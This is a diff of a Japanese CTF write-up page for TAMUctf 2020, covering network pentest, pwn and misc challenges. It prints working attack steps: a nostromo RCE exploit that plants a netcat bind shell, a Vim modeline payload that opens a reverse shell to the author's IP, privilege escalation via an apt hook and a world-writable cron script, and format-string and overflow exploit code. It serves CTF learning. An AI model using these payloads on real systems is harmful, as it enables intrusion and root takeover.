@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.59.1 with theme even" />
+<meta name="generator" content="Hugo 0.68.3 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/tamuctf_2020/" />
@@ -46,16 +46,13 @@
 <meta property="article:modified_time" content="2020-03-30T15:30:00+09:00" />
 <meta itemprop="name" content="TAMUctf 2020 Writeup">
 <meta itemprop="description" content="URL: https://tamuctf.com/challenges Network Pentestのチャレンジがあったり、とても面白かったです！！ ちょうど2月末くらいからHack The BoxでMachineを攻略し始めてい">
-
-
 <meta itemprop="datePublished" content="2020-03-30T15:30:00&#43;09:00" />
 <meta itemprop="dateModified" content="2020-03-30T15:30:00&#43;09:00" />
-<meta itemprop="wordCount" content="3398">
+<meta itemprop="wordCount" content="3386">
 
 
 
-<meta itemprop="keywords" content="CTF," />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="TAMUctf 2020 Writeup"/>
 <meta name="twitter:description" content="URL: https://tamuctf.com/challenges Network Pentestのチャレンジがあったり、とても面白かったです！！ ちょうど2月末くらいからHack The BoxでMachineを攻略し始めてい"/>
 
@@ -139,98 +136,80 @@
   <h2 class="post-toc-title">Contents</h2>
   <div class="post-toc-content">
     <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#network-pentest-my-first-blog">[Network Pentest]: MY_FIRST_BLOG</a>
-<ul>
-<li><a href="#challenge">Challenge</a></li>
-<li><a href="#solution">Solution</a></li>
-</ul></li>
-<li><a href="#network-pentest-obituary-1-obituary-2">[Network Pentest]: OBITUARY_1 &amp; OBITUARY_2</a>
-<ul>
-<li><a href="#challenge-1">Challenge</a></li>
-<li><a href="#solution-1">Solution</a></li>
-</ul></li>
-<li><a href="#pwn-echo-as-a-service">[Pwn]: ECHO_AS_A_SERVICE</a>
-<ul>
-<li><a href="#challenge-2">Challenge</a></li>
-<li><a href="#solution-2">Solution</a></li>
-</ul></li>
-<li><a href="#pwn-troll">[Pwn]: TROLL</a>
-<ul>
-<li><a href="#challenge-3">Challenge</a></li>
-<li><a href="#solution-3">Solution</a></li>
-</ul></li>
-<li><a href="#misc-corrupted-disk">[Misc]: CORRUPTED_DISK</a>
-<ul>
-<li><a href="#challenge-4">Challenge</a></li>
-<li><a href="#solution-4">Solution</a></li>
-</ul></li>
-<li><a href="#misc-zippity-doo-dah">[Misc]: ZIPPITY_DOO_DAH</a>
-<ul>
-<li><a href="#challenge-5">Challenge</a></li>
-<li><a href="#solution-5">Solution</a></li>
-</ul></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#network-pentest-my_first_blog">[Network Pentest]: MY_FIRST_BLOG</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#network-pentest-obituary_1--obituary_2">[Network Pentest]: OBITUARY_1 &amp; OBITUARY_2</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-echo_as_a_service">[Pwn]: ECHO_AS_A_SERVICE</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-troll">[Pwn]: TROLL</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-corrupted_disk">[Misc]: CORRUPTED_DISK</a>
+      <ul>
+        <li><a href="#challenge-4">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-zippity_doo_dah">[Misc]: ZIPPITY_DOO_DAH</a>
+      <ul>
+        <li><a href="#challenge-5">Challenge</a></li>
+        <li><a href="#solution-5">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
 </nav>
   </div>
 </div>
     <div class="post-content">
-      
-
-<div class='align-right'>
-  
+      <div class='align-right'>
 <a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Ftamuctf_2020%2F">
 <img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
 </a>
-
 </div>
-
-<p>URL: <a href="https://tamuctf.com/challenges" target="_blank">https://tamuctf.com/challenges</a>
+<p>URL: <a href="https://tamuctf.com/challenges">https://tamuctf.com/challenges</a>
 <br /><br />
 Network Pentestのチャレンジがあったり、とても面白かったです！！</p>
-
 <p>ちょうど2月末くらいからHack The BoxでMachineを攻略し始めていて、それがとても役に立ちました。</p>
-
 <p>サーバもとても安定していて、よかったですね。</p>
-
-<p><br>
-以下がスコアです。</p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/tamuctf_2020_Score1.png" alt="tamuctf_2020_Score1.png"></p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/tamuctf_2020_Score2.png" alt="tamuctf_2020_Score2.png"></p>
-
+<br>
+以下がスコアです。
+<img src="https://captureamerica.github.io/writeups/img/tamuctf_2020_Score1.png" alt="tamuctf_2020_Score1.png">
+<img src="https://captureamerica.github.io/writeups/img/tamuctf_2020_Score2.png" alt="tamuctf_2020_Score2.png">
 <p><br /><br /></p>
-
-<h2 id="network-pentest-my-first-blog">[Network Pentest]: MY_FIRST_BLOG</h2>
-
-<hr />
-
+<h2 id="network-pentest-my_first_blog">[Network Pentest]: MY_FIRST_BLOG</h2>
+<hr>
 <h3 id="challenge">Challenge</h3>
-
 <blockquote>
 <p>Here is a link to my new blog! I read about a bunch of exploits in common server side blog tools so I just decided to make my website static. Hopefully that should keep it secure.
 <br /><br />
 Root owns the flag.
 <br /><br />
-<a href="http://172.30.0.2/" target="_blank">http://172.30.0.2/</a></p>
+http://172.30.0.2/</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>my-first-blog.ovpn</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution">Solution</h3>
-
 <p>まず、nmapです。とりあえずサクっと Version Scan だけしてみました。</p>
-
 <pre>
 captureamerica@kali:~/Downloads$ nmap -sV 172.30.0.2 -p 80
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-20 08:42 +08
@@ -243,10 +222,8 @@ PORT   STATE SERVICE VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.74 seconds
 </pre>
-
-<p><br>
-ウェブサーバがnostromoというので動いているようです。searchsploitでexploitを探します。</p>
-
+<br>
+ウェブサーバがnostromoというので動いているようです。searchsploitでexploitを探します。
 <pre>
 captureamerica@kali:~/Downloads$ searchsploit nostromo
 ----------------------------------------------------------------------------------------- ----------------------------------------
@@ -259,12 +236,9 @@ nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution            
 ----------------------------------------------------------------------------------------- ----------------------------------------
 Shellcodes: No Result
 </pre>
-
-<p><br>
-2番目の47837.pyがよさそうです。バージョン1.9.6も同じだし、RCEだし。</p>
-
+<br>
+2番目の47837.pyがよさそうです。バージョン1.9.6も同じだし、RCEだし。
 <p>ダウンロードして、いちおう文字コードも直しておきます。</p>
-
 <pre>
 captureamerica@kali:~/Downloads$ searchsploit -m exploits/multiple/remote/47837.py
   Exploit: nostromo 1.9.6 - Remote Code Execution
@@ -277,14 +251,10 @@ Copied to: /home/captureamerica/Downloads/47837.py
 
 captureamerica@kali:~/Downloads$ nkf -w -Lu --overwrite 47837.py 
 </pre>
-
-<p><br>
-あ、あと、47837.py のアタマの方にコメント等が入っているので、消しておかないとエラーになります。</p>
-
+<br>
+あ、あと、47837.py のアタマの方にコメント等が入っているので、消しておかないとエラーになります。
 <p>ちなみに、CVE-2019-16278のようです。</p>
-
 <p>引数で任意のコマンドが指定できるようです。バックドアをしかけます。</p>
-
 <pre>
 captureamerica@kali:~/Downloads$ ./47837.py 172.30.0.2 80 "nc -l -p 3333 -e /bin/bash"
 
@@ -304,20 +274,16 @@ captureamerica@kali:~/Downloads$ ./47837.py 172.30.0.2 80 "nc -l -p 3333 -e /bin
 
 
 </pre>
-
-<p><br>
-これで、別のターミナルからncで繋ぐことができます。</p>
-
+<br>
+これで、別のターミナルからncで繋ぐことができます。
 <pre>
 captureamerica@kali:~/Downloads$ nc 172.30.0.2 3333
 id
 uid=1000(webserver) gid=1000(webserver) groups=1000(webserver)
 
 </pre>
-
-<p><br>
-いろいろ探した結果、crontabの中で以下が見つかりました。/usr/bin/healthcheck がroot権限で動いているようです。</p>
-
+<br>
+いろいろ探した結果、crontabの中で以下が見つかりました。/usr/bin/healthcheck がroot権限で動いているようです。
 <pre>
 cat /etc/crontab
 # /etc/crontab: system-wide crontab
@@ -329,40 +295,33 @@ cat /etc/crontab
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
-# m h dom mon dow user  command
-17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
-25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
-47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
-52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 #
 * * * * * root /usr/bin/healthcheck
 </pre>
-
-<p><br>
+<br>
 しかも、パーミッションが777です。
 <pre>
 ls -l /usr/bin/ | grep healthcheck
 -rwxrwxrwx 1 root root         98 Mar 19 18:41 healthcheck
-</pre></p>
-
-<p><br>
-ここでうっかりファイルの中身を消してしまい、DiscordでAdminの人にゴメンナサイしたところ、サーバはチーム毎にあるから好きにしていいよ、とのことでした。</p>
-
+</pre>
+<br>
+ここでうっかりファイルの中身を消してしまい、DiscordでAdminの人にゴメンナサイしたところ、サーバはチーム毎にあるから好きにしていいよ、とのことでした。
 <p>ということで、</p>
-
 <pre>
 cd /usr/bin/
 echo "nc -l -p 4444 -e /bin/bash" > healthcheck
 </pre>
-
-<p><br>
-ただし、これはなぜか動かなかったので、違うポート番号（123）で試したらいけました。</p>
-
+<br>
+ただし、これはなぜか動かなかったので、違うポート番号（123）で試したらいけました。
 <pre>
 echo "nc -l -p 123 -e /bin/bash" > healthcheck
 </pre>
-
-<p><br>
+<br>
 <pre>
 captureamerica@kali:~/Downloads$ nc 172.30.0.2 123
 id
@@ -372,40 +331,28 @@ total 4
 -rw-rw-r-- 1 root root 29 Mar 19 18:41 flag.txt
 cat flag.txt
 gigem{l1m17_y0ur_p3rm15510n5}
-</pre></p>
-
-<p><br>
-Flag: <code>gigem{l1m17_y0ur_p3rm15510n5}</code></p>
-
+</pre>
+<br>
+Flag: `gigem{l1m17_y0ur_p3rm15510n5}`
 <p><br /><br />
 <br /><br /></p>
-
-<h2 id="network-pentest-obituary-1-obituary-2">[Network Pentest]: OBITUARY_1 &amp; OBITUARY_2</h2>
-
-<hr />
-
+<h2 id="network-pentest-obituary_1--obituary_2">[Network Pentest]: OBITUARY_1 &amp; OBITUARY_2</h2>
+<hr>
 <h3 id="challenge-1">Challenge</h3>
-
 <blockquote>
-<p>Hey, shoot me over your latest version of the code. I have a simple nc session up, just pass it over when you're ready.
+<p>Hey, shoot me over your latest version of the code. I have a simple nc session up, just pass it over when you&rsquo;re ready.
 <br /><br />
-You're using vim, right? You should use it; it'll change your life. I basically depend on it for everything these days!
+You&rsquo;re using vim, right? You should use it; it&rsquo;ll change your life. I basically depend on it for everything these days!
 <br /><br />
 NOTE: This challenge is two parts. Flag one belongs to mwazoski. Flag two belongs to root.</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>obituary.ovpn</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-1">Solution</h3>
-
 <p>まず、nmapします。</p>
-
 <pre>
 captureamerica@kali:~/Downloads$ sudo nmap -sV -sC -oA nmap 172.30.0.2
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-20 11:20 +08
@@ -419,41 +366,30 @@ MAC Address: 02:42:EE:81:CE:1E (Unknown)
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 193.42 seconds
 </pre>
-
-<p><br>
-変なポート (4321) が一個開いているだけでした。</p>
-
-<p><br>
-Vimがなんじゃらって言っているので、Vimに関する脆弱性を探して、以下が見つかりました。</p>
-
-<p><a href="https://medium.com/@magrabursofily/exploit-poc-linux-command-execution-on-vim-neovim-vulnerability-cve-2019-12735-4c770d5573cf" target="_blank">https://medium.com/@magrabursofily/exploit-poc-linux-command-execution-on-vim-neovim-vulnerability-cve-2019-12735-4c770d5573cf</a></p>
-
-<p><br>
-正直、意味がわからないですが、コピペ＆編集して以下のようなテキストファイルを作ります。ファイル名は、vim_cmd.txtにしました。(172.30.0.14は自分のIPです。)</p>
-
+<br>
+変なポート (4321) が一個開いているだけでした。
+<br>
+Vimがなんじゃらって言っているので、Vimに関する脆弱性を探して、以下が見つかりました。
+<p><a href="https://medium.com/@magrabursofily/exploit-poc-linux-command-execution-on-vim-neovim-vulnerability-cve-2019-12735-4c770d5573cf">https://medium.com/@magrabursofily/exploit-poc-linux-command-execution-on-vim-neovim-vulnerability-cve-2019-12735-4c770d5573cf</a></p>
+<br>
+正直、意味がわからないですが、コピペ＆編集して以下のようなテキストファイルを作ります。ファイル名は、vim_cmd.txtにしました。(172.30.0.14は自分のIPです。)
 <pre>
 :!nc -nv 172.30.0.14 4444 -e /bin/sh ||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
 </pre>
-
-<p><br>
-チャレンジ文より、&quot;shoot me over your latest version of the code&quot; とのことなので、こいつを投げてみます。</p>
-
+<br>
+チャレンジ文より、"shoot me over your latest version of the code" とのことなので、こいつを投げてみます。
 <p>別ターミナルで <code>nc -l -p 4444</code> で待受けをしておいて、以下のコマンドで投げます。</p>
-
 <pre>
 nc 172.30.0.2 4321 < vim_cmd.txt
 </pre>
-
-<p><br>
-繋がりました。</p>
-
+<br>
+繋がりました。
 <pre>
 captureamerica@kali:~/CTF/TAMUctf_2020/Obituary$ nc -l -p 4444
 id
 uid=1000(mwazowski) gid=1000(mwazowski) groups=1000(mwazowski)
 </pre>
-
-<p><br>
+<br>
 このユーザ（mwazowski）が所有するファイルをみてみます。
 <pre>
 find / -user mwazowski
@@ -472,15 +408,13 @@ find / -user mwazowski
 /dev/pts/0
 :
 :
-</pre></p>
-
-<p><br>
-どうやら、screenを使っているようです。</p>
-
+</pre>
+<br>
+どうやら、screenを使っているようです。
 <pre>
 screen -ls
 There is a screen on:
-    756.Jw7hxfsUAP  (03/20/20 03:33:45) (Detached)
+	756.Jw7hxfsUAP	(03/20/20 03:33:45)	(Detached)
 1 Socket in /run/screen/S-mwazowski.
 screen -r 756
 Must be connected to a terminal.
@@ -490,10 +424,8 @@ python -c 'import pty; pty.spawn("/bin/bash");'
 screen -r 756
 Must be connected to a terminal.
 </pre>
-
-<p><br>
-このterminalなんじゃらのエラー(&quot;Must be connected to a terminal&quot;)は、ちょっとググったところ <code>script /dev/null</code> で直るとのこと。</p>
-
+<br>
+このterminalなんじゃらのエラー("Must be connected to a terminal")は、ちょっとググったところ `script /dev/null` で直るとのこと。
 <pre>
 script /dev/null
 Script started, file is /dev/null
@@ -523,16 +455,12 @@ mwazowski@97c3648d9667:~$ cat flag.txt
 cat flag.txt
 gigem{ca7_1s7_t0_mak3_suRe}
 </pre>
-
-<p><br>
-ユーザフラグ、ゲットです。</p>
-
+<br>
+ユーザフラグ、ゲットです。
 <p>Flag: <code>gigem{ca7_1s7_t0_mak3_suRe}</code></p>
-
 <p><br /><br />
 <br /><br />
 次はrootのフラグです。</p>
-
 <pre>
 mwazowski@97c3648d9667:~$ sudo -l
 sudo -l
@@ -543,12 +471,9 @@ Matching Defaults entries for mwazowski on 97c3648d9667:
 User mwazowski may run the following commands on 97c3648d9667:
     (root) NOPASSWD: /usr/bin/apt
 </pre>
-
-<p><br>
-aptが実行できるみたいです。</p>
-
+<br>
+aptが実行できるみたいです。
 <p>ここで、aptを使った権限昇格をググって調べました。以下がやり方です。</p>
-
 <pre>
 mwazowski@97c3648d9667:~$ sudo apt update -o APT::Update::Pre-Invoke::="/bin/bash -i"
 
@@ -564,39 +489,26 @@ root@97c3648d9667:~# cat flag.txt
 cat flag.txt
 gigem{y0u_w0u1d_7h1nk_p3opl3_W0u1d_Kn0W_b3773r}
 </pre>
-
-<p><br>
-rootのフラグ、ゲットです。</p>
-
+<br>
+rootのフラグ、ゲットです。
 <p>Flag: <code>gigem{y0u_w0u1d_7h1nk_p3opl3_W0u1d_Kn0W_b3773r}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
-<h2 id="pwn-echo-as-a-service">[Pwn]: ECHO_AS_A_SERVICE</h2>
-
-<hr />
-
+<h2 id="pwn-echo_as_a_service">[Pwn]: ECHO_AS_A_SERVICE</h2>
+<hr>
 <h3 id="challenge-2">Challenge</h3>
-
 <blockquote>
-<p>Echo as a service (EaaS) is going to be the newest hot startup! We've tapped a big market: Developers who really like SaaS.
+<p>Echo as a service (EaaS) is going to be the newest hot startup! We&rsquo;ve tapped a big market: Developers who really like SaaS.
 <br /><br />
 nc challenges.tamuctf.com 4251</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>echoasaservice (ELF 64bit)</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-2">Solution</h3>
-
 <p>まずはサーバに繋いでみて、動きを確認します。</p>
-
 <pre>
 captureamerica@kali:~/CTF/TAMUctf_2020$ nc challenges.tamuctf.com 4251
 Echo as a service (EaaS)
@@ -614,16 +526,13 @@ bye
 Echo as a service (EaaS)
 ^C
 </pre>
-
-<p><br>
-入力した文字列がそのままEcho backされてくるだけです。</p>
-
-<p><br>
-Ghidraでソースを調べます。</p>
-
+<br>
+入力した文字列がそのままEcho backされてくるだけです。
+<br>
+Ghidraでソースを調べます。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -671,17 +580,12 @@ Ghidraでソースを調べます。</p>
 <span class="p">}</span></code></pre></td></tr></table>
 </div>
 </div>
-
 <p>FSB (Format String Bug) がありますね。（printf(local_28);の箇所）</p>
-
-<p><br>
-テキトーに %1$s から順番に見ていけばそのうちフラグが出るだろうと思ってやってみたんですが、全然出てこない。。。</p>
-
-<p><br>
-ローカルでちょこちょこテストしていたところ、<code>%8$p</code> <code>%9$p</code> 辺りで文字列になりそうな数字が出ているのに気づきました。</p>
-
+<br>
+テキトーに %1$s から順番に見ていけばそのうちフラグが出るだろうと思ってやってみたんですが、全然出てこない。。。
+<br>
+ローカルでちょこちょこテストしていたところ、`%8$p` `%9$p` 辺りで文字列になりそうな数字が出ているのに気づきました。
 <p>しかも、順番がreverseになってます。</p>
-
 <pre>
 0x6c667b6d65676967
 lf{megig
@@ -689,10 +593,8 @@ lf{megig
 0x7d757365645f6761
 }used_ga
 </pre>
-
-<p><br></p>
-
-<p>ということで、CTFサーバ側にも同様なことをやってみます。
+<br>
+<p>ということで、CTFサーバ側にも同様なことをやってみます。</p>
 <pre>
 captureamerica@kali:~/CTF/TAMUctf_2020$ nc challenges.tamuctf.com 4251
 Echo as a service (EaaS)
@@ -708,48 +610,34 @@ Echo as a service (EaaS)
 %11$p
 (nil)
 Echo as a service (EaaS)
-</pre></p>
-
-<p><br>
-以下のように文字列に変換しました。</p>
-
+</pre>
+<br>
+以下のように文字列に変換しました。
 <pre>
 captureamerica@kali:~/CTF/TAMUctf_2020$ unhex 7d316e6c75765f74616d7230665f797361337b6d65676967 | rev ; echo
 gigem{3asy_f0rmat_vuln1}
 </pre>
-
 <p>Flag: <code>gigem{3asy_f0rmat_vuln1}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="pwn-troll">[Pwn]: TROLL</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-3">Challenge</h3>
-
 <blockquote>
-<p>There's a troll who thinks his challenge won't be solved until the heat death of the universe.
+<p>There&rsquo;s a troll who thinks his challenge won&rsquo;t be solved until the heat death of the universe.
 <br /><br />
 nc challenges.tamuctf.com 4765</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>troll (ELF 64bit)</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-3">Solution</h3>
-
 <p>Ghidraでソースを調べます。</p>
-
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -837,31 +725,24 @@ nc challenges.tamuctf.com 4765</p>
 <span class="p">}</span></code></pre></td></tr></table>
 </div>
 </div>
-
 <p>やっていること：</p>
-
 <ol>
 <li>time()で時間を取る<br></li>
 <li>上記の値を使ってsrand()コール<br></li>
 <li>rand()を使って、1~100000の乱数を生成<br></li>
 <li>これを99回ぴったり予想できたらフラグ表示<br></li>
 </ol>
-
 <p>だいたい、こんな感じ。だと思います。</p>
-
-<p><br>
-どうして最初に名前を入力する箇所があるのかを考えると、BOFを使ってsrand()の引数を初期化し乱数を固定する、というのが解法のようですね。</p>
-
-<p><br>
-名前は <code>local_58[44]</code> に入るので、srand()の引数になっている <code>local_18</code> を上書きするには、他のローカル変数等を考慮すると76バイト(44+32)に必要になります。</p>
-
-<p>全部 'A' で埋めちゃうことにします。</p>
-
-<p><br>
-別途Cでコードを書いて、0x4141414141414141をシードにしたときの乱数のリストを予め計算しておきます。</p>
+<br>
+どうして最初に名前を入力する箇所があるのかを考えると、BOFを使ってsrand()の引数を初期化し乱数を固定する、というのが解法のようですね。
+<br>
+名前は `local_58[44]` に入るので、srand()の引数になっている `local_18` を上書きするには、他のローカル変数等を考慮すると76バイト(44+32)に必要になります。
+<p>全部 &lsquo;A&rsquo; で埋めちゃうことにします。</p>
+<br>
+別途Cでコードを書いて、0x4141414141414141をシードにしたときの乱数のリストを予め計算しておきます。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -912,14 +793,14 @@ nc challenges.tamuctf.com 4765</p>
 		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">local_1c</span><span class="p">);</span>
 		<span class="n">local_c</span> <span class="o">=</span> <span class="n">local_c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
 	<span class="p">}</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br>
-Pwnのコードです。</p>
+</div><br>
+Pwnのコードです。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -946,6 +827,7 @@ Pwnのコードです。</p>
 </span><span class="lnt">25
 </span><span class="lnt">26
 </span><span class="lnt">27
+</span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
@@ -974,77 +856,52 @@ Pwnのコードです。</p>
     <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
     <span class="k">print</span><span class="p">(</span><span class="s2">&#34;0x{:x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
     <span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>  <span class="c1"># Impressive</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span></code></pre></td></tr></table>
-</div>
-</div>
-<p><br>
-Flag <code>gigem{Y0uve_g0ne_4nD_!D3fe4t3d_th3_tr01L!}</code></p>
+    <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
 
+</code></pre></td></tr></table>
+</div>
+</div><br>
+Flag `gigem{Y0uve_g0ne_4nD_!D3fe4t3d_th3_tr01L!}`
 <p><br /><br />
 <br /><br /></p>
-
-<h2 id="misc-corrupted-disk">[Misc]: CORRUPTED_DISK</h2>
-
-<hr />
-
+<h2 id="misc-corrupted_disk">[Misc]: CORRUPTED_DISK</h2>
+<hr>
 <h3 id="challenge-4">Challenge</h3>
-
 <blockquote>
-<p>We've recovered this disk image but it seems to be damaged. Can you recover any useful information from it?</p>
+<p>We&rsquo;ve recovered this disk image but it seems to be damaged. Can you recover any useful information from it?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>recovered_disk.img</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-4">Solution</h3>
-
 <p>これは、foremostで取れました。</p>
-
 <p>Flag: <code>gigem{wh3r3_w3r3_601n6_w3_d0n7_n33d_h34d3r5}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
-<h2 id="misc-zippity-doo-dah">[Misc]: ZIPPITY_DOO_DAH</h2>
-
-<hr />
-
+<h2 id="misc-zippity_doo_dah">[Misc]: ZIPPITY_DOO_DAH</h2>
+<hr>
 <h3 id="challenge-5">Challenge</h3>
-
 <blockquote>
 <p>Lorelei, a nuclear engineer, is practicing how to create folders to organize her notes. She works closely with POTUS to secure our nuclear missiles. In order for her to send the nuclear codes to the correct authorities, she needs to zip all the files and make the data hard to find. Your mission, should you choose to accept it, is to intercept and find the codes (the flag).</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>zipFolder.zip</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-5">Solution</h3>
-
 <p>Zipを解凍すると大量にテキストファイルが出てくるんですが、テキストファイルは全部Decoyで、フラグはZipの中にあった画像ファイルからzstegで取れます。</p>
-
 <pre>
 === zsteg ===
 b1,rgb,lsb,xy       .. text: "gigem{z1pT4st1c__$kiLl$$$}"
 </pre>
-
-<p><br>
-Flag: <code>gigem{z1pT4st1c__$kiLl$$$}</code></p>
-
+<br>
+Flag: `gigem{z1pT4st1c__$kiLl$$$}`
 <p><br /><br />
 <br /><br /></p>
-
-<hr />
-
+<hr>
 <p><br /><br />
 <br /><br /></p>
 
